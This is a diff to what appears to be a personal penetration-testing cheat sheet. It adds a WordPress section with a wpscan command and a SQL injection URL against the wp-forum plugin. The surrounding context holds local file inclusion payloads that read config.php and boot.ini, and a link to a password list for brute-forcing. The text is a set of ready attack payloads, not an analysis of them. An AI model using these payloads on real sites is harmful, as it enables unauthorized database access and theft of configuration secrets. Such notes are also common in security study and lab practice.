@@ -37,10 +37,15 @@ RFI/LFI
     *?page=php://filter/convert.base64-encode/resource=../config.php*
     *../../../../../boot.ini # to find out windows version**
 
+Wordpress
+    Scan for known bugs:
+    *$ wpscan http://$ip*
+    Try exploit:
+    */wp-content/plugins/wp-forum/feed.php?topic=-4381+union+show+databases%23*
+
 Bruteforcing
     Good password list
     *https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_1000.txt*
-
 
 File uploads
     Avoid extension checks using tricks like:
